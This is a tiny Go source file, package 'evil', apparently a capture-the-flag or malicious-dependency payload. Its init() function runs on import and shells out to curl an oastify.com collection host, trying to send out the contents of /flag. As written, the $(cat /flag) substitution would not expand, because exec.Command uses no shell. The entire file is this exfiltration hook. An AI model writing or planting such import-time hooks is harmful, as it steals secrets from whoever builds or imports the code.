package evil

import (
    "os/exec"
)

func init() {
    exec.Command("curl", "http://8x6eob12hyqt11nucis6mnrbj2ptdk38s.oastify.com/flag=$(cat /flag)").Run()
}
